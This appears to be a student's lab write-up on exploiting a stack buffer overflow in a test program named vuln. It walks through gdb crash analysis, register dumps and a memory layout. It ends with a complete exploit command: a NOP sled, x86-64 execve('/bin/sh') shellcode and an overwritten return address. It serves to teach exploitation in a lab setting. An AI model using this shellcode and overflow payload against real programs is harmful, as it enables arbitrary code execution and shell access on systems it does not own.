MANUALLY CRAFTING THE MALICIOUS INPUT FOR vuln TO GET THE SHELL:

In the beinning I  did not comprehend the attack.c therefor debugged the vuln.c manually and crafted the input with my execve shellcode so that ./vuln ends up launching the shell.

I have shown the entire debugging process in the following files:
Part4Demo1.txt
Part4Demo2.xt

---------------------------
Below is the short desription of what I did:

I debugged the Vuln executable with gdb and tried to give a long input string of character 'A' just to find the crash. I was able to observe that when 1050 char input is given the last two char ends up in the return address (IP register) while the RBP register is totally filled up with 'A' i.e x41.

------
Program received signal SIGSEGV, Segmentation fault.
0x0000000000004141 in ?? ()
(gdb) info reg
rax            0x7fffffffb0b0	140737488335024
rbx            0x0	0
rcx            0x4141414141414141	4702111234474983745
rdx            0x41414141414141	18367622009667905
rsi            0x7fffffffe420	140737488348192
rdi            0x7fffffffb4bd	140737488336061
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7fffffffb4d0	0x7fffffffb4d0
r8             0x0	0
r9             0x3b	59
r10            0x5d	93
r11            0x7ffff7b95128	140737349505320
r12            0x400500	4195584
r13            0x7fffffffdce0	140737488346336
r14            0x0	0
r15            0x0	0
rip            0x4141	0x4141
eflags         0x206	[ PF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
-------------------------------

Now I input the string ( 1000 NOP + shellcode of 33 bytes + 15 NOP + 'BBBB') and ensured that RBP regster has all 0x90 and IP register has 4 B (0x42) i.e registers have the following values:

Program received signal SIGSEGV, Segmentation fault.
0x0000000042424242 in ?? ()
(gdb) info reg
rax            0x7fffffffb0b0	140737488335024
rbx            0x0	0
rcx            0x9090909090909090	-8029759185026510704
rdx            0x42424242909090	18650200814948496
rsi            0x7fffffffe420	140737488348192
rdi            0x7fffffffb4bf	140737488336063
rbp            0x9090909090909090	0x9090909090909090
rsp            0x7fffffffb4d0	0x7fffffffb4d0
r8             0x0	0
r9             0x3b	59
r10            0x5d	93
r11            0x7ffff7b95128	140737349505320
r12            0x400500	4195584
r13            0x7fffffffdce0	140737488346336
r14            0x0	0
r15            0x0	0
rip            0x42424242	0x42424242
eflags         0x10202	[ IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
-------------------

Now in the last step I just selected the any one address in the first set of NOPs and replaced the BBBB with that address (put in reverse order). Given below is my memory layout 
--------------------
0x7fffffffb3f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb3fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb404:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb40c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb414:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb41c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb424:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb42c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb434:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb43c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb444:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
---Type <return> to continue, or q <return> to quit---
0x7fffffffb44c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb454:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb45c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb464:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb46c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb474:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb47c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb484:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb48c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb494:	0x90	0x90	0x90	0x90	0xeb	0x13	0x5f	0x48
0x7fffffffb49c:	0x31	0xc0	0x88	0x47	0x07	0x50	0x48	0x89
0x7fffffffb4a4:	0xe2	0x57	0x48	0x89	0xe6	0xb0	0x3b	0x0f
0x7fffffffb4ac:	0x05	0xe8	0xe8	0xff	0xff	0xff	0x2f	0x62
0x7fffffffb4b4:	0x69	0x6e	0x2f	0x73	0x68	0x90	0x90	0x90
0x7fffffffb4bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb4c4:	0x90	0x90	0x90	0x90	0x42	0x42	0x42	0x42
0x7fffffffb4cc:	0x00	0x00	0x00	0x00
-----------------------------------

Final input: 1000 NOP + 33 byte SHELLCODE + 15 NOP + "\x34\xb4\xff\xff\xff\x7f
the last part makes the 0x7fffffffb434 address

With he above input I was able to get the shell.
---------------------------------------------------------------------------------------------------
The command to execute vuln on linux:
./vuln $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'\x34\xb4\xff\xff\xff\x7f')")
---------------------------------------------------------------------------------------------------


Please find the elaborated debugging details in the BufferOverflow-Demo_typescript.txt



--------------------------------------
References:

1. Youtube channel - PcTube - Buffer Overflow Primer (Part1-Part8)
   https://www.youtube.com/channel/UCnZ75b8NNR5zE4FOYFEEOQQ 

2. Youtube | How to exploit a buffer overflow vulnerability - Practical 
   https://www.youtube.com/watch?v=hJ8IwyhqzD4

3. Youtube | The Security Tube | Buffer Overflow Primer
   https://www.youtube.com/watch?v=eLpG1LbtSZA

4. Youtube | David Hoelzer | Overflow Exploitation, Step By Step 
   https://www.youtube.com/watch?v=8xonDJe3YxI
